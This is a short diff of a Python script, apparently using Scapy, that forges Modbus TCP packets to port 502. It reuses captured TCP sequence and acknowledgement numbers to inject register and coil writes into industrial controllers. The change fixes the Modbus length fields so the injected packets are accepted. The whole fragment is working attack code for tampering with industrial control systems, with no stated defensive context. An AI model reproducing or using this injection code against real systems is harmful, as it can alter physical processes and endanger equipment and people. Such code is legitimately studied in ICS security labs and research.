@@ -51,6 +51,7 @@ def changeData_reg(addr, val):
        TCP(sport=sport, dport=502, seq=seq_frame2, ack=ack_frame2, flags='PA')/\
        ModbusTCP()/\
        Modbus()
+    mb_reg[ModbusTCP].Length = 9
     mb_reg[Modbus].ref_num = addr
     mb_reg[Modbus].reg_val = val
     sendp(mb_reg)
@@ -62,6 +63,7 @@ def changeData0(addr):
        TCP(sport=sport, dport=502, seq=seq_frame2, ack=ack_frame2, flags='PA')/\
        ModbusTCP()/\
        Modbus0()
+    mb_0[ModbusTCP].Length = 6
     mb_0[Modbus0].ref_num = addr
     sendp(mb_0)
 
@@ -72,6 +74,7 @@ def changeData1(addr):
        TCP(sport=sport, dport=502, seq=seq_frame2, ack=ack_frame2, flags='PA')/\
        ModbusTCP()/\
        Modbus1()
+    mb_1[ModbusTCP].Length = 6
     mb_1[Modbus1].ref_num = addr
     sendp(mb_1)
 
